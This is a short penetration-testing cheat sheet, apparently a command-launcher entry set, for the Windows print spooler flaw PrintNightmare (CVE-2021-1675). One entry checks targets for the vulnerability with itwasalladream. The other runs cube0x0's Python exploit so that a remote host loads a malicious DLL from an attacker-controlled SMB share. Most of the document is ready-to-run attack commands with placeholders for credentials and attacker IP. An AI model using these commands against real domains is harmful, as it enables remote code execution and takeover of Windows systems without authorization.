# ItWasAllADream

% itwasalladream, printnightmare, Active Directory

## ItwasAllADream
#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user

Check if the targeted host is vulnerable to PrintNightmare (CVE-2021-1675).
The 'ip' parameter also handles the path to file containing a list of IPs.

```bash
itwasalladream -u <user> -p <password> -d <domain> <ip>
```

# PrintNightmare

% itwasalladream, printnightmare, Active Directory

## PrintNightmare
#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user

Exploit the PrintNightmare (CVE-2021-1675) vulnerability on the remote target using cube0x0's exploit.

⚠️ Here, PrintNightmare has been aliased to cube0x0's python exploit. Otherwise, launch the command with python3 CVE-2021-1675.py ...

```bash
PrintNightmare <domain>/<user>:<password>@"<ip>".<domain> '\\<attacker_ip>\<dll_path>'
```

= ip: 192.168.1.0
= dc-ip: $DC_IP
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
= dll_path: EXEGOL\PrintNightmare.dll
